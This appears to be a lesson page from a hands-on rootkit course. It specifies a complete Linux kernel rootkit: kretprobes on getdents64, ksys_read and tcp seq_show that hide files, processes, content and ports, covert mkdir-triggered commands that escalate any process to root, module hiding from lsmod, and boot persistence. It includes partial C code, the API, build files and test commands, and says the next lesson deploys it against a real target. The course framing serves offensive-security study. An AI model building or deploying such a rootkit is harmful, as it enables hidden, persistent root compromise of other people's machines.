# M01: Covert Local Control

Assemble everything into a complete local rootkit.
No new concepts.
The challenge is wiring seven files, six kretprobes, four target lists, and
sixteen commands together with correct init ordering and cleanup chains.

## Architecture

```text
  mkdir rklings.h.f.secret
    |
    v
  dispatch.c: strip "rklings.", longest-prefix match "h.f"
    |
    v
  filter.c: cmd_hide_file("secret") --> rk_target_add(&file_targets, "secret")

  ls /tmp
    |
    v
  getdents64 kretprobe (filter.c)
    |
    v
  walk dirent buffer, rk_target_match each d_name
    |
    v
  memmove to remove "secret", copy_to_user, regs_set_return_value
    |
    v
  ls shows everything except "secret"
```

## Init ordering

`rk_init` registers subsystems first, then probes.
Each probe depends on the previous, so they use a goto chain:

```c
ret = rk_escalate_init();      // register "e"
ret = rk_module_cmds_init();   // register persist, unpersist, h.m, u.m
ret = rk_filter_init();        // register h.f, u.f, h.i, ... h.p, u.p
ret = rk_proc_init();          // create /proc/rklings

ret = register_kretprobe(&rk_mkdir_probe);     // goto fail_mkdir
ret = register_kretprobe(&rk_mkdirat_probe);   // goto fail_mkdirat
ret = register_kretprobe(&rk_getdents_probe);  // goto fail_getdents
ret = register_kretprobe(&rk_read_probe);      // goto fail_read
ret = register_kretprobe(&rk_tcp4_probe);      // goto fail_tcp4
ret = register_kretprobe(&rk_tcp6_probe);      // goto fail_tcp6

return 0;

fail_tcp6:  unregister_kretprobe(&rk_tcp4_probe);
fail_tcp4:  unregister_kretprobe(&rk_read_probe);
fail_read:  unregister_kretprobe(&rk_getdents_probe);
...
```

Exit reverses: unhide module, unregister probes in reverse, remove proc.

## Subsystem ownership

Each file registers only its own commands.
No file reaches into another subsystem's business:

| Owner | Commands |
|-------|----------|
| init.c | ping, status |
| escalation.c | e |
| module.c | persist, unpersist, h.m, u.m |
| filter.c | h.f, u.f, h.i, u.i, h.c, u.c, h.p, u.p |

## You write

7 files, ~600 lines total:

| File | Responsibility |
|------|---------------|
| `include/rootkit.h` | Shared types, externs, declarations |
| `core/init.c` | module_init/exit, goto chain, ping/status |
| `core/dispatch.c` | Command registry, mkdir/mkdirat kretprobes |
| `core/escalation.c` | Credential escalation, deferred PID, /proc/rklings |
| `core/module.c` | Persistence, module hiding |
| `core/target.c` | Spinlock-protected target list |
| `core/filter.c` | getdents64 + ksys_read + tcp seq_show kretprobes |

```make
ccflags-y := -I$(src)/include
obj-m += rklings.o
rklings-y := core/init.o core/dispatch.o core/escalation.o \
             core/module.o core/target.o core/filter.o
```

## API

```c
// Command registration (dispatch.c)
typedef int (*rk_handler_t)(const char *arg);
int rk_cmd_register(const char *key, rk_handler_t handler);
int rk_dispatch(const char *name);

// Target list (target.c)
struct rk_target_list { spinlock_t lock; char targets[32][64]; int count; };
void rk_target_init(struct rk_target_list *list);
int  rk_target_add(struct rk_target_list *list, const char *name);
int  rk_target_remove(struct rk_target_list *list, int idx);
bool rk_target_match(struct rk_target_list *list, const char *name);
bool rk_line_matches(struct rk_target_list *list, const char *line, int len);

// Subsystem init
int rk_escalate_init(void);
int rk_module_cmds_init(void);
int rk_filter_init(void);

// Six kretprobes
extern struct kretprobe rk_mkdir_probe;     // __x64_sys_mkdir
extern struct kretprobe rk_mkdirat_probe;   // __x64_sys_mkdirat
extern struct kretprobe rk_getdents_probe;  // __x64_sys_getdents64
extern struct kretprobe rk_read_probe;      // ksys_read
extern struct kretprobe rk_tcp4_probe;      // tcp4_seq_show
extern struct kretprobe rk_tcp6_probe;      // tcp6_seq_show
```

All 16 mkdir commands:

| Command | Action |
|---------|--------|
| `rklings.e` | Escalate current process |
| `rklings.e.<pid>` | Defer escalation for PID |
| `rklings.ping` | Log pong |
| `rklings.status` | Log state |
| `rklings.persist` | Write /etc/modules-load.d entry |
| `rklings.unpersist` | Remove persistence |
| `rklings.h.m` | Hide module from lsmod |
| `rklings.u.m` | Unhide module |
| `rklings.h.f.<name>` | Hide file from ls |
| `rklings.u.f.<idx>` | Unhide file |
| `rklings.h.i.<pid>` | Hide PID from ps |
| `rklings.u.i.<idx>` | Unhide PID |
| `rklings.h.c.<str>` | Hide lines from reads |
| `rklings.u.c.<idx>` | Unhide content |
| `rklings.h.p.<port>` | Hide port from ss |
| `rklings.u.p.<idx>` | Unhide port |

## Test it

Build and load as root, then test as student:

```
$ mkdir rklings.e && id
uid=0(root)

$ touch /tmp/secret && mkdir rklings.h.f.secret
$ ls /tmp/ | grep secret
(no output)
$ cat /tmp/secret
(works, file still exists)

$ nc -l -p 4444 &
$ mkdir rklings.h.p.4444
$ ss -tlnp | grep 4444
(no output)
$ curl localhost:4444
(connects, port still listening)

$ mkdir rklings.h.m
$ lsmod | grep rklings
(no output)

$ mkdir rklings.persist
$ cat /etc/modules-load.d/rklings.conf
rklings
```

## Validate

```
$ rklings validate m01
  [+] module loaded
  [+] 16 commands registered
  [+] escalation works (self and PID)
  [+] file hidden from ls, still accessible
  [+] PID hidden from ps, still running
  [+] content hidden from cat, still in file
  [+] port hidden from ss, still listening
  [+] module hidden from lsmod
  [+] persistence writes and clears
  [+] clean unload after unhide
  PASS
```

## Next

D00 deploys this rootkit against a real target: initial access, privilege
escalation, and insmod from the outside.
